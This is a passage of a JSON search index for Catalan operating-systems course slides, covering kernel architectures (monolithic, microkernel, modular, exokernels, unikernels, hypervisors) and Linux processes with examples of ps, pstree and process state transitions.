    "text": "Microkernel vs Monolític\n\n\n\n\nEl microkernel és més lent però més segur i fiable que el nucli monolític. El nucli monolític és ràpid però menys segur, ja que qualsevol fallada del servei pot causar un bloqueig del sistema.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#microkernel-vs-monolític-vs-híbrids",
    "href": "slides/02-kernel.html#microkernel-vs-monolític-vs-híbrids",
    "title": "Kernel de Linux",
    "section": "Microkernel vs Monolític vs Híbrids",
    "text": "Microkernel vs Monolític vs Híbrids",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#opinió-sobre-els-híbrids",
    "href": "slides/02-kernel.html#opinió-sobre-els-híbrids",
    "title": "Kernel de Linux",
    "section": "Opinió sobre els híbrids",
    "text": "Opinió sobre els híbrids\nMolts experts en sistemes operatius consideren que el terme híbrid és un terme de màrqueting més que una categoria tècnica clara. Aquest terme s’utilitza sovint per descriure sistemes operatius que combinen elements de nuclis monolítics i microkernel, però la seva definició exacta pot variar segons l’ús i la interpretació.\n\n“As to the whole ‘hybrid kernel’ thing - it’s just marketing. It’s ‘oh, those microkernels had good PR, how can we try to get good PR for our working kernel? Oh, I know, let’s use a cool name and try to imply that it has all the PR advantages that that other system has’ - Linus Torvalds",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#kernel-modular",
    "href": "slides/02-kernel.html#kernel-modular",
    "title": "Kernel de Linux",
    "section": "Kernel Modular",
    "text": "Kernel Modular\n\nEl serveis (core) estan integrats al kernel, la resta es poden carregar i descarregar de forma dinàmica.\n\n\nNo cal reiniciar per afegir nous mòduls.\nNo cal implementar mecanismes de pas de missatges com en els microkernels.\nQualsevol mòdul pot comunicar-se amb qualsevol altre.\n\n\n\n\n\nEls sistemes operatius modulars com la majoria de sistemes operatius monolítics moderns com Linux, BSD, poden carregar (i descarregar) dinàmicament mòduls executables en temps d’execució.\nAquesta modularitat del sistema operatiu és a nivell binari (imatge) i no a nivell d’arquitectura.\nPràcticament, carregar mòduls dinàmicament és simplement una manera més flexible de manejar la imatge del sistema operatiu en temps d’execució, en lloc de reiniciar-lo amb una imatge diferent del sistema operatiu.\nEls mòduls permeten ampliar fàcilment les capacitats dels sistemes operatius segons sigui necessari.\nEls mòduls que es poden carregar dinàmicament comporten una petita sobrecàrrega en comparació amb la incorporació del mòdul a la imatge del sistema operatiu.\nTanmateix, en alguns casos, carregar mòduls dinàmicament (segons calgui) ajuda a mantenir la quantitat de codi que s’executa a l’espai del nucli al mínim; per exemple, per minimitzar la petjada del sistema operatiu per a dispositius incrustats o aquells amb recursos de maquinari limitats. És a dir, no cal que un mòdul descarregat s’emmagatzemi en memòria d’accés aleatori escàs.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#monolític-i-modular",
    "href": "slides/02-kernel.html#monolític-i-modular",
    "title": "Kernel de Linux",
    "section": "Monolític i Modular",
    "text": "Monolític i Modular\n\nEls kernels monolítics poden ser modulars.\nEls mòduls es carreguen i descarreguen dinàmicament en temps d’execució.\nEls components es poden activar o desactivar en temps de compilació.\nEl kernel s’organitza en subsistemes lògics independents.\nInterfícies estrictes però amb baix cost en rendiment: macros, funcions en línia, punters a funcions.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#exemple-linux",
    "href": "slides/02-kernel.html#exemple-linux",
    "title": "Kernel de Linux",
    "section": "Exemple: Linux",
    "text": "Exemple: Linux\n\n\n\nEl nucli Linux és un dels projectes de codi obert més grans del món, amb milers de desenvolupadors que aporten codi i milions de línies de codi canviats per a cada versió.\n\n\nArquitectura Monolítica híbrida basada en mòduls.\n\nEnllaçat dinàmic.\nMòduls apilables.\n\nDisseny orientat a objectes.\nSuport per a múltiples fils d’execució.\nSuport per processament múltiple simètric.\nAbstracció hardware.\n\n\n\n\n\n\n\nEs distribueix sota la llicència GPLv2, que simplement esmenta, requereix que qualsevol modificació del nucli feta amb el programari que s’envia al client s’hagi de posar a la seva disposició (els clients), tot i que a la pràctica la majoria de les empreses posen el codi font a disposició del públic.\nPer tal d’escalar el procés de desenvolupament, Linux utilitza un model de manteniment jeràrquic:\nLinus Torvalds és el mantenidor del nucli Linux i fa merge dels pull requests de la comunitat.\nLa comunitat té un o més mantenidors que accepten patches de desenvolupadors, mantenint el seu propi arbre git.\n\nLinux Torvalds: git\nDavid Miller (treball en xarxa): git",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#hypervisors",
    "href": "slides/02-kernel.html#hypervisors",
    "title": "Kernel de Linux",
    "section": "Hypervisors",
    "text": "Hypervisors\n\nCapa fina sobre el maquinari\nSistemes host dins màquines virtuals\nNormalment requereixen característiques de maquinari (p.e. Intel VT-x)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#hypervisors-1",
    "href": "slides/02-kernel.html#hypervisors-1",
    "title": "Kernel de Linux",
    "section": "Hypervisors",
    "text": "Hypervisors\n\n\n\nKVM és un mòdul del kernel Linux que permet la virtualització a través d’un sistema host.\nXEN és un hypervisor de codi obert que permet la virtualització directa del maquinari.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#exokernels",
    "href": "slides/02-kernel.html#exokernels",
    "title": "Kernel de Linux",
    "section": "Exokernels",
    "text": "Exokernels\n\nCada màquina virtual disposa d’un exokernel que exporta directament els recursos físics.\n\n\nNo implementa abstraccions altes (fitxers, sockets, processos), sinó que ofereix primitives de baix nivell (p. ex. blocs de disc, pàgines de memòria, línies de CPU).\nNomés valida i arbitra l’ús dels recursos, delegant la seva gestió a biblioteques d’usuari.\nMou la multiprogramació a l’espai d’usuari, com la planificació, la gestió de memòria i la comunicació entre processos (IPC).\n🤏 Els exokernels són tan petits que poden ser incorporats dins aplicacions específiques (p. ex. control de trànsit urbà).\n✨ minimitza l’overhead i dona flexibilitat en la gestió de recursos.\n\n\n👉 No es traslladen instruccions de mode kernel a mode usuari, sinó la lògica de gestió de recursos.\n\n\nImaginem que particionem una màquina en diferents màquines virtuals amb un subconjunt de recursos. Cada màquina virtual té un exokernel que li permet accedir directament als recursos de la màquina física. La idea és reduir el overhead del sistema separant la multiprogramació de les funcions del sistema operatiu en l’espai usuari.\nEn aquest cas no estem movent instruccions de mode kernel a mode usuari, sinó que estem movent la gestió de recursos del sistema operatiu a l’espai d’usuari. De fet, els exokernels són tan petits que poden ser incrustats en aplicacions específiques. Per exemple, un exokernel podria ser incrustat en una aplicació de control de trànsit per coordinar els semàfors d’una ciutat.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#unikernels",
    "href": "slides/02-kernel.html#unikernels",
    "title": "Kernel de Linux",
    "section": "Unikernels",
    "text": "Unikernels\n\nEls unikernels empaqueten aplicació + mínim sistema operatiu en una única imatge executable sobre un hipervisor o hardware.\n\n\nNomés s’inclouen les llibreries i serveis estrictament necessaris per l’aplicació.\nExecució directa: corren sobre un hipervisor o hardware, sense cap OS d’host per sota.\nEficiència: imatges extremadament petites, ràpides d’arrencar.\nInspiració:\n\nDels contenidors, però sense dependre d’un kernel complet subjacent.\nDels exokernels, però aquí les primitives exposades no són per al maquinari, sinó per a les necessitats específiques de l’aplicació.\n\nS’utilitzen en IoT, serveis cloud lleugers, entorns on importen temps d’arrencada i seguretat.\n\n\nEl codi de l’aplicació i el kernel formen una sola unitat optimitzada.\n\n\nEls unikernels són una forma de sistema operatiu que empaqueta tot el codi necessari per a una aplicació en un sol paquet. Aquest paquet s’executa directament sobre una màquina virtual o un hipervisor, sense cap sistema operatiu subministrat. Això permet als unikernels ser molt petits i molt eficients, ja que no hi ha cap codi innecessari.\nS’inspiren en els contenidors, però en lloc d’executar-se en un sistema operatiu complet, s’executen directament sobre el hardware. Això els fa molt més petits i molt més eficients que els contenidors, ja que no hi ha cap sistema operatiu subministrat.\nS’inspiren en els exokernels, però en lloc de proporcionar un conjunt de primitives de baix nivell per accedir directament als recursos de la màquina, proporcionen un conjunt de primitives de baix nivell per accedir directament als recursos de l’aplicació.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#això-és-tot-per-avui",
    "href": "slides/02-kernel.html#això-és-tot-per-avui",
    "title": "Kernel de Linux",
    "section": "Això és tot per avui",
    "text": "Això és tot per avui\n\n\nTAKE HOME MESSAGE\n\nEls monolítics ofereixen velocitat però fragilitat.\nEls microkernels aposten per modularitat i seguretat a costa de latència.\nEls modulars permeten créixer sense reescriure tot el nucli.\nEls exokernels lliuren el control directe a l’aplicació per màxima eficiència.\nEls hipervisors faciliten la convivència d’ecosistemes sencers sobre un mateix hardware.\nEls unikernels empaqueten aplicació i SO per a desplegaments ultralleugers i segurs.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/03-procs.html#què-és-un-procés",
    "href": "slides/03-procs.html#què-és-un-procés",
    "title": "Processos a Linux",
    "section": "Què és un procés?",
    "text": "Què és un procés?\nUn procés és una instancia d’un programa en execució (tasca). Això vol dir que si 10 usuaris d’un servidor utilitzen el mateix programa, com vi, hi ha 10 processos vi que s’executen al servidor, tot i que tots comparteixen el mateix codi executable.\n\nCreació i eliminació.\nGarantir l’execució i finalització.\nControlar errors i excepcions.\nAssignació de recursos.\nComunicació i sincronització.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#ps-i",
    "href": "slides/03-procs.html#ps-i",
    "title": "Processos a Linux",
    "section": "ps (I)",
    "text": "ps (I)\nImagineu que utilitzem la comanda sleep 120 &. Aquest comanda ens crearà 3 processos sleep en background. La eina ps ens permet veure’ls.\n\n\nps -e\nL’opció -e indica a l’ordre que mostri tots els processos del sistema. Sense aquesta opció, l’ordre només mostra els processos de l’usuari a la sessió actual.\nAquests processos tenen PID 1053, 1054 i 1054. També observeu l’ordre ps al final de la llista. Això es deu al fet que l’ordre en si també és un procés.\n\nps -e\n    PID TTY          TIME CMD\n      1 ?        00:00:01 systemd\n      2 ?        00:00:00 kthreadd\n      3 ?        00:00:00 rcu_gp\n      4 ?        00:00:00 rcu_par_gp\n      6 ?        00:00:00 kworker/0:0H-events_highpri\n      9 ?        00:00:00 mm_percpu_wq\n     10 ?        00:00:00 rcu_tasks_rude_\n     11 ?        00:00:00 rcu_tasks_trace\n     12 ?        00:00:00 ksoftirqd/0\n     13 ?        00:00:03 rcu_sched\n     14 ?        00:00:00 migration/0\n     15 ?        00:00:00 cpuhp/0\n     17 ?        00:00:00 kdevtmpfs\n     18 ?        00:00:00 netns\n     ...\n   1053 pts/0    00:00:00 sleep\n   1054 pts/0    00:00:00 sleep\n   1055 pts/0    00:00:00 sleep\n   1056 pts/0    00:00:00 ps",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#ps-ii",
    "href": "slides/03-procs.html#ps-ii",
    "title": "Processos a Linux",
    "section": "ps (II)",
    "text": "ps (II)\n\n\nps -e\n\nLa columna CMD identifica el nom del procés en execució, com ara sleep.\nLa primera columna indica l’identificador de procés (PID) assignat al procés pel sistema operatiu.\nLa segona columna mostra el terminal associat a un procés o ? si el procés no s’associa a cap terminal.\nFinalment, la tercera columna mostra el temps de la CPU del procés.\n\n\nps -e\n    PID TTY          TIME CMD\n      1 ?        00:00:01 systemd\n      2 ?        00:00:00 kthreadd\n      3 ?        00:00:00 rcu_gp\n      4 ?        00:00:00 rcu_par_gp\n      6 ?        00:00:00 kworker/0:0H-events_highpri\n      9 ?        00:00:00 mm_percpu_wq\n     10 ?        00:00:00 rcu_tasks_rude_\n     11 ?        00:00:00 rcu_tasks_trace\n     12 ?        00:00:00 ksoftirqd/0\n     13 ?        00:00:03 rcu_sched\n     14 ?        00:00:00 migration/0\n     15 ?        00:00:00 cpuhp/0\n     17 ?        00:00:00 kdevtmpfs\n     18 ?        00:00:00 netns\n     ...\n   1053 pts/0    00:00:00 sleep\n   1054 pts/0    00:00:00 sleep\n   1055 pts/0    00:00:00 sleep\n   1056 pts/0    00:00:00 ps",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#ps-iii",
    "href": "slides/03-procs.html#ps-iii",
    "title": "Processos a Linux",
    "section": "ps (III)",
    "text": "ps (III)\n\n\n\nL’identificador de procés (PID) és un identificador únic per a un procés.\nEl sistema operatiu utilitza un comptador de 32 bits last_pid per fer un seguiment de l’últim PID assignat a un procés.\nQuan es crea un procés, el comptador augmenta i el seu valor es converteix en el PID del nou procés.\nEl kernel ha de comprovar si el valor de last_pid++ ja pertany a una tasca, abans que pugui assignar-lo a un procés nou.\n\n\nps -e\n    PID TTY          TIME CMD\n      1 ?        00:00:01 systemd\n      2 ?        00:00:00 kthreadd\n      3 ?        00:00:00 rcu_gp\n      4 ?        00:00:00 rcu_par_gp\n      6 ?        00:00:00 kworker/0:0H-events_highpri\n      9 ?        00:00:00 mm_percpu_wq\n     10 ?        00:00:00 rcu_tasks_rude_\n     11 ?        00:00:00 rcu_tasks_trace\n     12 ?        00:00:00 ksoftirqd/0\n     13 ?        00:00:03 rcu_sched\n     14 ?        00:00:00 migration/0\n     15 ?        00:00:00 cpuhp/0\n     17 ?        00:00:00 kdevtmpfs\n     18 ?        00:00:00 netns\n     ...\n   1053 pts/0    00:00:00 sleep\n   1054 pts/0    00:00:00 sleep\n   1055 pts/0    00:00:00 sleep\n   1056 pts/0    00:00:00 ps",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#top",
    "href": "slides/03-procs.html#top",
    "title": "Processos a Linux",
    "section": "top",
    "text": "top",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#estats-dels-processos",
    "href": "slides/03-procs.html#estats-dels-processos",
    "title": "Processos a Linux",
    "section": "Estats dels processos",
    "text": "Estats dels processos\n\n\n\nNou: Procés que encara no està creat del tot, li falta el PCB.\nInactiu: Quan un procés ha finalitzat.\nPreparat: Quan un procés té assignats tots els recursos necessaris per poder executar-se (excepte la CPU).\nExecució: Quan un procés té assignada la CPU.\nEspera: Quan al procés li falta algun recurs per poder executar-se.\n\n\n\n\n\nPer veure informació dels processos en UNIX tornarem a fer servir la comanda ps. Si fem man ps i busquem PROCESS STATE CODES, veurem el següents estats:\n\n\nD uninterruptible sleep (usually IO)\nI Idle kernel thread\nR running or runnable (on run queue)\nS interruptible sleep (waiting for an event to complete)\nT stopped by job control signal\nt stopped by debugger during the tracing\nW paging (not valid since the 2.6.xx kernel)\nX dead (should never be seen)\nZ defunct (“zombie”) process, terminated but not reaped by its parent",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#ps-iv",
    "href": "slides/03-procs.html#ps-iv",
    "title": "Processos a Linux",
    "section": "ps (IV)",
    "text": "ps (IV)\nEs pot mostrar més informació sobre la llista de processos mitjançant l’opció -l de l’ordre ps:\nps -l\nF S   UID     PID    PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD\n4 S     0    1034    1007  0  80   0 -  2095 -      pts/0    00:00:00 bash\n0 T     0    1059    1034  0  80   0 -  3448 -      pts/0    00:00:00 vi\n0 S     0    1064    1034  0  80   0 -  1326 -      pts/0    00:00:00 sleep\n4 R     0    1065    1034  0  80   0 -  2405 -      pts/0    00:00:00 ps\n\nLa primera columna (F) de la sortida anterior identifica els indicadors de procés (vegeu la pàgina del manual si esteu interessats). La columna (S) indica l’estat d’un procés.\nRecordeu que sense l’opció -e, ps només mostra els processos al terminal actual, en aquest cas pts/0.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#arbre-de-processos",
    "href": "slides/03-procs.html#arbre-de-processos",
    "title": "Processos a Linux",
    "section": "Arbre de processos",
    "text": "Arbre de processos\n\nEstructura jeràrquica dels processos en formada d’arbre.\nTots els processos tenen un procés pare, excepte el procés inicial (PID = 1).\nEls processos poden tenir zero o més processos fills.\nEls atributs PID i PPID identifiquen el procés i el seu pare.\n\n\nEn l’exemple anterior, podeu veure que el procés bash és el pare dels processos sleep i ps. Si esteu connectats per ssh al servidor, el procés bash és fill del procés sshd. I el procés sshd és fill del procés init (PID = 1).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qui-és-el-pare-de-pid1",
    "href": "slides/03-procs.html#qui-és-el-pare-de-pid1",
    "title": "Processos a Linux",
    "section": "Qui és el pare de PID=1?",
    "text": "Qui és el pare de PID=1?\nEl procés amb PID = 1 és el primer procés que s’inicia quan el sistema arrenca. Aquest procés es coneix com a init (o systemd en sistemes més moderns) i és el pare de tots els altres processos en execució al sistema.\n\nAquest procés el crea el kernel durant el procés d’arrencada del sistema operatiu.\nEl kernel és responsable de carregar i iniciar el sistema operatiu.\nAquest és l’únic procés que no té un procés pare, ja que és el primer procés que s’inicia en el sistema.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#què-és-un-procés-inactiu",
    "href": "slides/03-procs.html#què-és-un-procés-inactiu",
    "title": "Processos a Linux",
    "section": "Què és un procés inactiu?",
    "text": "Què és un procés inactiu?\nUn procés inactiu és un procés que esta esperant a que succeeixi un esdeveniment per poder continuar la seva execució.\nAquest esdeveniment pot ser una entrada de l’usuari, la finalització d’una operació d’entrada/sortida, o qualsevol altra condició que el procés necessita per continuar.\nLa majoria dels processos del sistema són inactius, que esperen algun tipus d’esdeveniment, com ara fer clic amb el ratolí o prémer una tecla. A l’exemple anterior, l’única ordre en execució és ps.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#pstree",
    "href": "slides/03-procs.html#pstree",
    "title": "Processos a Linux",
    "section": "pstree",
    "text": "pstree\n\n\nps -l\nF S   UID     PID    PPID  C PRI  NI ADDR SZ WCHAN  TTY      CMD\n4 S     0    1034    1007  0  80   0 -  2095 -      pts/0    bash\n0 T     0    1059    1034  0  80   0 -  3448 -      pts/0    vi\n0 T     0    1066    1034  0  80   0 -  3448 -      pts/0    vim\n0 T     0    1068    1034  0  80   0 -  2358 -      pts/0    top\n0 T     0    3502    1034  0  80   0 - 30692 -      pts/0    emacs\n0 T     0    3505    1034  0  80   0 - 30692 -      pts/0    emacs\n4 R     0    3569    1034  0  80   0 -  2405 -      pts/0    ps\n\nsu root -c \"apt-get install psmisc -y\"\n\npstree\nsystemd-|-agetty\n        |--cron\n        |--dbus-daemon\n        |--dhclient---3*[{dhclient}]\n        |--exim4\n        |--rsyslogd---3*[{rsyslogd}]\n        |--sshd-|-sshd---bash-|-2*[emacs---{emacs}]\n        |       |             |--pstree\n        |       |             |--top\n        |       |             |--vi\n        |       |             |--vim\n        |       |--sshd---bash---emacs---{emacs}\n        |--systemd---(sd-pam)\n        |--systemd-journal\n        |--systemd-logind\n        |--systemd-timesyn---{systemd-timesyn}\n        |--systemd-udevd\n        |--wpa_supplicant",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#diagrama-de-transició-destats-i",
    "href": "slides/03-procs.html#diagrama-de-transició-destats-i",
    "title": "Processos a Linux",
    "section": "Diagrama de transició d’estats (I)",
    "text": "Diagrama de transició d’estats (I)\nEl temps de vida d’un procés X pot ser dividit en un conjunt d’estats que descriuen el comportament de l’procés.\n\nExecutant-se en mode usuari.\nExecutant-se en mode nucli o supervisor.\nPreparat en memòria principal per a ser executat. El procés no està executant, però està carregat en memòria principal. A punt per ser executat quan el planificador de processos ho decideixi.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#diagrama-de-transició-destats-ii",
    "href": "slides/03-procs.html#diagrama-de-transició-destats-ii",
    "title": "Processos a Linux",
    "section": "Diagrama de transició d’estats (II)",
    "text": "Diagrama de transició d’estats (II)\n\nDormit o bloquejat en memòria principal. El procés es troba esperant en memòria principal a què es produeixi un determinat esdeveniment, com per exemple, la finalització d’una operació d’E/S.\nPreparat en memòria secundària per a ser executat. El procés esta preparat per a ser executat, però està intercanviat a memòria secundària (disc).\nDormit o bloquejat en memòria secundària. El procés està esperant en memòria secundària a què es produeixi un determinat esdeveniment.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#diagrama-de-transició-destats-iii",
    "href": "slides/03-procs.html#diagrama-de-transició-destats-iii",
    "title": "Processos a Linux",
    "section": "Diagrama de transició d’estats (III)",
    "text": "Diagrama de transició d’estats (III)\n\nCreat. El procés s’ha creat recentment i està en un estat de transició. El procés existeix, però no es troba preparat per ser executat ni tampoc està adormit. Aquest estat és l’inicial per a tots els processos.\nZombi. Aquest és l’estat final d’un procés. S’arriba mitjançant l’execució explícitament o implícita de la crida a sistema exit.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#diagrama-de-transició-destats-iv",
    "href": "slides/03-procs.html#diagrama-de-transició-destats-iv",
    "title": "Processos a Linux",
    "section": "Diagrama de transició d’estats (IV)",
    "text": "Diagrama de transició d’estats (IV)\n\nExpropiat. Quan un procés (A) executant-se en mode usuari ha finalitzat el seu temps:\n\nEl SO envia una interrupció del rellotge de sistema.\nEl tractament d’aquesta interrupció s’ha de fer en mode kernel.\nS’expropia el procés A i un cop en mode kernel el planificador de processos pot decidir quin és el següent procés que s’executarà.\n\n\n\nL’estat expropiat es similar a l’estat preparat en memòria principal per ser executat, però un procés expropiat té garantit que el seu pròxim estat serà execució en mode usuari quan torni a ser planificat per ser executat",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#diagrama-de-transició-destats-v",
    "href": "slides/03-procs.html#diagrama-de-transició-destats-v",
    "title": "Processos a Linux",
    "section": "Diagrama de transició d’estats (V)",
    "text": "Diagrama de transició d’estats (V)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#transicions-destat-creació-i-execució-dun-procés",
    "href": "slides/03-procs.html#transicions-destat-creació-i-execució-dun-procés",
    "title": "Processos a Linux",
    "section": "Transicions d’estat: Creació i execució d’un procés",
    "text": "Transicions d’estat: Creació i execució d’un procés\nQuan un nou procés (A) es crea, mitjançant una crida a sistema fork realitzada per un altre procés (B), el primer estat en què entra A és l’estat creat. Des d’aquí pot passar, depenent de si hi ha prou espai en memòria principal: a) preparat per a execució en memòria principal o b) preparat per a execució en memòria secundària.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#transicions-destat-crida-a-sistema",
    "href": "slides/03-procs.html#transicions-destat-crida-a-sistema",
    "title": "Processos a Linux",
    "section": "Transicions d’estat: Crida a sistema",
    "text": "Transicions d’estat: Crida a sistema\n\nUn procés A invoca en mode usuari una crida a sistema, per exemple read(), per llegir dades d’un fitxer. En aquest moment el procés A passa a l’estat execució en mode nucli on s’executa la crida a sistema.\nread() necessita realitzar una operació d’E/S amb el disc, llavors el kernel ha d’esperar que es completi l’operació.\nEl procés A passa a l’estat adormit en memòria principal.\nQuan es completa l’operació d’E/S, el maquinari interromp a la CPU i el manipulador de la interrupció despertarà el procés, la qual cosa provocarà que passi a l’estat preparat per a execució en memòria.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#transicions-destat-execució-en-memòria-secundària",
    "href": "slides/03-procs.html#transicions-destat-execució-en-memòria-secundària",
    "title": "Processos a Linux",
    "section": "Transicions d’estat: Execució en memòria secundària",
    "text": "Transicions d’estat: Execució en memòria secundària\n\nSuposem que en el sistema s’estan executant molts processos i que no hi ha prou espai en memòria.\nEl SO tria per ser intercanviats a memòria secundària a alguns processos que es troben en l’estat preparat per a execució en memòria principal o en l’estat expropiat.\nAquests processos passaran a l’estat preparat per a execució en memòria secundària.\nPer tornar a tenir possibilitat d’executar-se, aquests processos hauran de ser intercanviats de nou a memòria principal.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#transicions-destat-retorn-a-memòria-principal",
    "href": "slides/03-procs.html#transicions-destat-retorn-a-memòria-principal",
    "title": "Processos a Linux",
    "section": "Transicions d’estat: Retorn a memòria principal",
    "text": "Transicions d’estat: Retorn a memòria principal\n\nEn un moment donat, l’intercanviador tria el procés més apropiat per intercanviar a la memòria principal.\nAquest passa a l’estat preparat per a execució en memòria.\nEl planificador en algun instant triarà el procés per executar-se i llavors passarà a l’estat execució.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#transicions-destat-finalitzant-el-procés",
    "href": "slides/03-procs.html#transicions-destat-finalitzant-el-procés",
    "title": "Processos a Linux",
    "section": "Transicions d’estat: Finalitzant el procés",
    "text": "Transicions d’estat: Finalitzant el procés\nQuan el procés es completi, invocarà explícitament o implícitament a la crida a sistema exit, en conseqüència passarà a l’estat execució en mode supervisor. Quan es completi aquesta crida a sistema passarà finalment a l’estat zombi.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qui-controla-les-transicions-destat",
    "href": "slides/03-procs.html#qui-controla-les-transicions-destat",
    "title": "Processos a Linux",
    "section": "Qui controla les transicions d’estat?",
    "text": "Qui controla les transicions d’estat?\nUn procés té control sobre algunes transicions d’estat. En primer lloc, un procés pot crear un altre procés. No obstant això, és el kernel qui decideix en quin moment es realitzen la transició des de l’estat creat a l’estat preparat per a execució en memòria principal o a l’estat preparat per a execució en memòria secundària.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qui-controla-les-transicions-destat-1",
    "href": "slides/03-procs.html#qui-controla-les-transicions-destat-1",
    "title": "Processos a Linux",
    "section": "Qui controla les transicions d’estat?",
    "text": "Qui controla les transicions d’estat?\nUn procés pot invocar una crida a sistema, el que provocarà que passi de l’estat execució en mode usuari a l’estat execució en mode kernel. No obstant això, el procés no té control de quan tornarà d’aquest estat, fins i tot alguns esdeveniments poden produir que mai retorni i passi a l’estat zombi.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qui-controla-les-transicions-destat-2",
    "href": "slides/03-procs.html#qui-controla-les-transicions-destat-2",
    "title": "Processos a Linux",
    "section": "Qui controla les transicions d’estat?",
    "text": "Qui controla les transicions d’estat?\nUn procés pot finalitzar realitzant una invocació explícita de la crida a sistema exit, però d’altra banda esdeveniments externs també poden fer que es produeixi l’acabament de l’procés.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#qui-controla-les-transicions-destat-3",
    "href": "slides/03-procs.html#qui-controla-les-transicions-destat-3",
    "title": "Processos a Linux",
    "section": "Qui controla les transicions d’estat?",
    "text": "Qui controla les transicions d’estat?\nLa resta de les transicions d’estat segueixen un model rígid codificat en el nucli. Per tant, el canvi d’estat d’un procés davant l’aparició de certs esdeveniments es realitza d’acord a unes regles predefinides.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#exemples-pràctics-i",
    "href": "slides/03-procs.html#exemples-pràctics-i",
    "title": "Processos a Linux",
    "section": "Exemples pràctics (I)",
    "text": "Exemples pràctics (I)\n\n\n\nObrirem 2 terminal i ens connectarem a debian per ssh.\nAnirem al terminal 1 i crearem un procés: sleep 120.\nAnirem al terminal 2 i observarem com el procés sleep es troba en estat (S - Interruptible sleep).\nEn la terminal 1 clicarem control-z (aquesta combinació serveix per aturar qualsevol procés).\nAnirem al terminal 2 i observarem que l’estat del procés sleep es (T - Stopped by job control signal).\nAnirem al terminal 1 i llençarem l’orde bg. Aquesta orde llança el procés pausat en segon pla (similar a executar-lo amb & al final, deixant el terminal lliure).\nAnirem al terminal 2 i observarem com el procés sleep ha retornat a l’estat (S - Interruptible sleep).\n\n\nsleep 100\n^Z\n#Procés aturat\nps -o pid,state,command  \nbg\n#Procés espera esdeveniment\nps -o pid,state,command",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#exemples-pràctics-ii",
    "href": "slides/03-procs.html#exemples-pràctics-ii",
    "title": "Processos a Linux",
    "section": "Exemples pràctics (II)",
